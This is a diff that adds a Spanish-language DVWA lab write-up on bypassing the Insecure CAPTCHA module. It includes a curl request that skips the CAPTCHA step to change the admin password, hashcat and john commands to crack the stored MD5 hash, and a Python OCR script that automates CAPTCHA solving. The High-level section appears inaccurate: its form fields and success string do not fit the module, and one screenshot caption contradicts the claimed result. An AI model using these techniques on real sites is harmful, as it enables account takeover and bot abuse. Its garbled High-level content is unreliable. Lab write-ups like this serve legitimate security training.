@@ -138,3 +138,256 @@ Aunque en el resultado que nos arroja la herramienta curl anteriormente no se en
 | step=1 / step=2        | Parámetro que controla el flujo del formulario. `step=2` ejecuta el cambio. |
 | Change=Change          | Par clave-valor que activa la lógica del formulario en el backend.           |
 | Evidencia              | Capturas que demuestran el fallo: HTML oculto, error CAPTCHA, login exitoso.|
+| Falla lógica. |        | Error en la secuencia de validaciones que permite saltarse protecciones.    |
+| Validación condicional. | | Verificación que depende de un paso anterior. Si no se repite, puede fallar |
+| Flujo de formulario | Secuencia de pasos que sigue el usuario. Aquí se salta el paso del CAPTCHA. | 
+
+## 🧩 Insecure CAPTCHA – Nivel Medium (DVWA)
+
+### 📌 Descripción
+
+En el nivel Medium, DVWA introduce una validación real del CAPTCHA en el backend. Sin embargo, existe una falla lógica: el CAPTCHA solo se verifica en el primer paso (step=1), pero no se revalida en el segundo paso (step=2), lo que permite a un atacante bypassear la protección enviando directamente el segundo paso
+
+### 🎯 Objetivo
+
+- Cambiar contraseña del usuario `admin` sin resolver correctamente el CAPTCHA.
+- Aprovechar la falta de validación en `step=2` para automatizar el ataque.
+
+### 🔧 Requisitos
+
+- DVWA corriendo en http://127.0.0.1:8080/
+- Usuario autenticado (admin)
+- Nivel de seguridad configurado en Medium
+- Herramientas:
+  - Navegador con inspector (F12)
+  - curl para enviar peticiones manuales
+  - Acceso a la base de datos MySQL para verificar el cambio
+
+### 🧠 Lógica del backend PHP (medium.php)
+
+#### 🥇 Paso 1 (step=1)
+
+```php
+if( isset( $_POST[ 'Change' ] ) && $_POST[ 'step' ] == '1' ) {
+    // Verifica el CAPTCHA usando reCAPTCHA
+    // Si es correcto, muestra el formulario oculto con step=2
+}
+```
+
+
+<img width="553" height="98" alt="imagen" src="https://github.com/user-attachments/assets/e96fd300-dcc5-4897-b1b4-11f53ebf2c22" />
+
+
+- Aquí ***sí se valida el CAPTCHA*** con `recaptcha_check_answer(...)`.
+- Si el CAPTCHA falla, no se muestra el segundo formulario. Sin embargo, si se supera, muestra el formulario con el step 2.
+
+#### 🥈 Paso 2 (step=2)
+
+```php
+if( isset( $_POST[ 'Change' ] ) && $_POST[ 'step' ] == '2' ) {
+    // Compara las contraseñas
+    // Aplica md5() a la nueva contraseña
+    // Ejecuta un UPDATE en la base de datos
+}
+```
+
+
+<img width="583" height="261" alt="imagen" src="https://github.com/user-attachments/assets/a3a7a955-18ee-495e-9de8-7498a8543940" />
+
+
+- Este bloque ***no vuelve a verificar el CAPTCHA***.
+- Si el atacante ***envía directamente `step=2`,*** se ejecuta el cambio de contraseña sin pasar por el CAPTCHA.
+
+### 🧪 Comando curl para vulnerar
+
+```bash
+curl -X POST "http://127.0.0.1:8080/vulnerabilities/captcha/" \
+--cookie "PHPSESSID=TU_SESION; security=medium" \
+--header "Content-Type: application/x-www-form-urlencoded" \
+--data "step=2&password_new=nueva123&password_conf=nueva123&Change=Change"
+```
+
+Este comando omite el CAPTCHA y ejecuta directamente el cambio de contraseña.
+
+Sustituye TU_SESION por tu valor real de sesión. DVWA no valida que hayas pasado por step=1, así que el backend ejecuta el cambio directamente.
+
+
+<img width="948" height="33" alt="imagen" src="https://github.com/user-attachments/assets/5f00b5c3-f7af-455e-83b4-4ef2a62d2f99" />
+
+
+Mensaje de error del Captcha en la respueta a nuestro comando ejecutado.
+
+### 🧬 Verificación en la base de datos desde el contenedor Docker: DVWA
+
+1. Verificamos el nombre del contenedor en el que trabajamos:
+
+```bash
+docker ps
+```
+
+```codigo
+CONTAINER ID   IMAGE                  COMMAND      CREATED      STATUS          PORTS                                   NAMES
+9297528d943f   vulnerables/web-dvwa   "/main.sh"   5 days ago   Up 25 minutes   0.0.0.0:8080->80/tcp, :::8080->80/tcp   dvwa
+```
+
+2. Accedemos al contenedor
+
+```bash
+docker exec -it dvwa bash
+```
+
+Esto nos mete dentro del contenedor como si fuera una máquina virtual.
+
+3. Accedemos a MySQL desde dentro del contenedor
+
+```bash
+mysql -u root -p
+```
+
+Ponemos nuestro usuario y contraseña.
+
+4. Consultamos la base de datos dvwa:
+
+```sql
+USE dvwa;
+SELECT user, password FROM users WHERE user = 'admin';
+```
+
+5. Nos muestra el hash en formato MD5, que es el algoritmo por defecto en DVWA para almacenar contraseñas en niveles bajo de seguridad.
+
+```codigo
+Database changed
+MariaDB [dvwa]> SELECT user, password FROM users WHERE user = 'admin';
++-------+----------------------------------+
+| user  | password                         |
++-------+----------------------------------+
+| admin | c9f7aa4e8534617f2413501aa1c32333 |
++-------+------------------
+```
+
+6. Intentamos crackearla con herramientas como:
+
+#### 🧨 1. hashcat
+
+```bash
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Donde hash.txt contiene solo el hash.
+
+#### 🧨 2. john the ripper
+
+```bash
+echo "c9f7aa4e8534617f2413501aa1c32333" > hash.txt
+john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+<img width="845" height="218" alt="imagen" src="https://github.com/user-attachments/assets/cf91a22d-5aed-462e-8e8b-986a33615934" />
+
+Y, como nos muestra la herramienta, vemos que hemos modificado la contraseña a nueva123 y el hash que obtenimos nos lo muestra también.
+
+### 📚 Información extra para documentar
+
+- **Falla lógica de validación:** Aunque el CAPTCHA se valida en el primer paso, no se verifica en el segundo, lo que permite el bypass.
+- **Importancia de validar en cada paso crítico:** El backend debe verificar que el CAPTCHA fue superado antes de ejecutar acciones sensibles.
+- **Simulación de flujo con curl:** Permite saltarse el frontend y enviar peticiones directas al servidor.
+- **Confirmación por hash:** Verificar el cambio en la base de datos es esencial para confirmar la explotación.
+
+## 🧩 Insecure CAPTCHA – Nivel High (DVWA)
+
+En el nivel High, DVWA implementa:
+
+- Un CAPTCHA que se ***genera dinámicamente*** y se valida en el servidor.
+- Un sistema que ***verifica sesión y tokens***.
+- Posible uso de ***cookies o tokens CSRF*** para evitar automatización.
+
+### 🧭 Paso a paso para vulnerarlo
+
+#### 1. 🔍 Inspecciona el formulario
+
+Desde la interfaz web:
+
+- Vamos a **Insecure CAPTCHA**.
+- Observa el formulario: campos de usuario, contraseña, CAPTCHA
+- Abre las herramientas de desarrollador (F12) y revisa el HTML
+
+Buscamos:
+
+- El 'src' de la imagen CAPTCHA (ej. captcha.php).
+- Si hay algún `token` oculto (`<input type="hidden" name="user_token" value="...">`).
+
+#### 2. 🕵️‍♂️ Intercepta con Burp Suite
+
+Hacemos una petición manual con credenciales falsas y capturamos la solicitud en Burp:
+
+```Http
+POST /vulnerabilities/captcha/ HTTP/1.1
+Host: localhost:8080
+...
+username=admin&password=123456&captcha=ABCD&user_token=xyz
+```
+
+Esto nos permite ver:
+
+- Cómo se envía el CAPTCHA.
+- Si el `user_token` cambia en cada carga.
+- Qué cookies se usan.
+
+#### 3. 🧠 Automatiza el ataque con Python + OCR
+
+Aquí viene lo divertido: automatizar el reconocimiento del CAPTCHA y enviar la petición. Este script básico te servirá de base:
+
+```Python
+import requests
+from bs4 import BeautifulSoup
+from PIL import Image
+import pytesseract
+from io import BytesIO
+
+# Inicia sesión
+session = requests.Session()
+url = "http://localhost:8080/vulnerabilities/captcha/"
+
+# Obtiene la página
+r = session.get(url)
+soup = BeautifulSoup(r.text, "html.parser")
+
+# Extrae el token
+token = soup.find("input", {"name": "user_token"})["value"]
+
+# Extrae la imagen del CAPTCHA
+captcha_img_url = "http://localhost:8080/" + soup.find("img")["src"]
+captcha_img = session.get(captcha_img_url)
+captcha_code = pytesseract.image_to_string(Image.open(BytesIO(captcha_img.content))).strip()
+
+# Envía la petición
+payload = {
+    "username": "admin",
+    "password": "nueva123",
+    "captcha": captcha_code,
+    "user_token": token
+}
+response = session.post(url, data=payload)
+
+# Verifica si fue exitoso
+if "Welcome to the password protected area" in response.text:
+    print("[+] Login exitoso")
+else:
+    print("[-] Falló el login")
+```
+
+💡 Puedes mejorar el OCR aplicando filtros a la imagen (blanco y negro, contraste, etc.) para aumentar la precisión.
+
+#### 4. 🧪 Repite el ciclo
+
+Cada vez que hagas una petición, el CAPTCHA y el token cambian. Así que el script debe:
+
+- Obtener la página.
+- Extraer el nuevo CAPTCHA.
+- Enviar la petición.
+
+### 🧠 ¿Qué estás aprendiendo aquí?
+
+- Cómo romper CAPTCHA básicos con OCR
+- Cómo manejar tokens dinámicos
+- Cómo automatizar ataques respetando sesiones y cookies
